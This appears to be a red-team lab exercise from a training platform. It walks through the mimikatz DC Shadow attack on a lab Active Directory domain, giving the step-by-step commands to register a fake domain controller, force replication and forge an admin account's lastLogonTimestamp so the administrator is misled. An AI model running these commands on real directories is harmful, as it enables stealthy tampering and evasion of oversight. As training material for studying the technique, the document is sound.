
## DC Shadow with mimiaktz

Running as SYSTEM

```powershell
privilege::debug 
token::elevate 
lsadump::dcshadow /stack /object:CN=Zoombie,DC=contoso,DC=com... 
... 
lsadump::dcshadow
```

Running as domain admin

```powershell
lsadump::dcshadow /push
```


(ING) LAB 5 - Domination and persistence

3 Hr 17 Min Remaining

Instructions Resources Help  100%

## Exercise 3 - Modify objects using the DC Shadow attack

There is an attribute on user and computer account that you can use to determine when the last time the user was used. This attribute has its own logic of update. It only updates with the current time of logon if the last time it was updated was more than 14 days ago. See the following 🔗[“The LastLogonTimeStamp Attribute” – “What it was designed for and how it works”](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/8220-the-lastlogontimestamp-attribute-8221-8211-8220-what-it-was/ba-p/396204)

Your goal in this exercise will be to set an arbitrary value for Katrina's account to fool the admin into thinking the account hasn't been used in a while.

1. Log on to **[CLI01](https://labclient.labondemand.com/Instructions/6e093b8a-2f3b-4901-9748-814f5963167c?rc=10#)**. Use the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
2. At this point, you should have two windows opened, a Windows Terminal prompt and a red prompt. If you have closed them re-open them by right clicking on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127864/11menu.png) and clicking on **Windows Terminal (Admin)**. In the **Windows Terminal** window, run the following: `runas /user:CONTOSO\katrina.mendoza.adm cmd.exe` and use the following password `NeverTrustAny1!`. A new command prompt should have popped up called **cmd.exe (running as CONTOSO\katrina.mendoza.adm)**. To make it easier to keep track, we'll rename the window and change the color. Run the following in that prompt `title Katrina's console & color 4F`.
    
3. In the **Terminal console**, make sure the current directory is where Mimikayz is by running `Set-Location \Tools\mimikatz` then run `.\mimikatz.exe`. In the mimikatz prompt, run the following to create a new instance of mimikatz running in the local system security context: `process::runp`.
    
    At this point you have three prompts.
    
    **1** The Windows Terminal console
    
    **2** The red prompt
    
    **3** The mikikatz prompt running as local system (you can easily spot it with its kiwi icon in the system tray ![KIWI.png](https://labondemand.blob.core.windows.net/content/lab127864/KIWI.png))
    
4. In the mimikatz prompt (with the kiwi icon), run the following: `lsadump::dcshadow /object:katrina.mendoza.adm /attribute:lastLogonTimestamp /value:123567890123456789`
    
    You might be asked to agree to the following prompt to allow incoming connections to mimikatz. ![FW.png](https://labondemand.blob.core.windows.net/content/lab127864/FW.png) Click **Allow access**.
    
    It starts a fake server and is waiting for a legit DC to replicate: ![WAIT.png](https://labondemand.blob.core.windows.net/content/lab127864/WAIT.png)
    
5. Switch to the red prompt, make sure you are in the right directory with `cd \Tools\mimikatz` then execute `mimikatz.exe`.
    
6. Now to force a legitimate DC to replicate with our fake server, run the following in the red prompt: `lsadump::dcshadow /push`
    
    Once the replication took place, the fake server will stop by itself: ![STOP.png](https://labondemand.blob.core.windows.net/content/lab127864/STOP.png)
    
    Let's check what Katrina's account look like.
    
7. Switch back to the **Terminal console**, if you are still in the mimikatz instance there, run `exit`
    
    ![EXIT.png](https://labondemand.blob.core.windows.net/content/lab127864/EXIT.png)
    
8. Now run the following: `Get-ADUser -Identity katrina.mendoza.adm -Properties lastLogonTimeStamp,lastLogonDate -Server DC01.contoso.com`
    
    📝 When is the "new" last logon date for that account?
    
    📝 What would be the mimikatz DC Shadow command to set the description attribute of the account with the value "I WAS HERE"?
    

Here you go. If **Mister Blue** is doing some reporting on accounts being used recetnly, this one will probably not show up :)

❓ What is the difference between **lastLogonTimestamp** and **LastLogonDate** in the PowerShell output? **Click here to see the answer**.

60% Tasks Complete

PreviousNext: Exercise 4 - Perform...

Live Chat